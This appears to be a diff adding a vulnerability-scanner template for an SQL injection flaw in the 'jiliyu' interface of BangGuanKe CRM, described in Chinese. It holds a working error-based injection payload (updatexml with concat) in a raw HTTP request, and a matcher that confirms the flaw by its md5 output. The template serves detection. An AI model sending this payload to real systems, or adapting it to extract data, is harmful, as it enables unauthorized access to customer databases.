@@ -1,0 +1,23 @@
+id: bgkcrm-jiliyu-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 帮管客CRM是一款基于互联网的客户关系管理软件,主要用于帮助企业管理客户关系、提高销售效率、优化营销策略等。其jiliyu接口存在SQl注入漏洞，攻击者可使用此漏洞通过报错注入获取到数据库数据。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=123&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)) HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
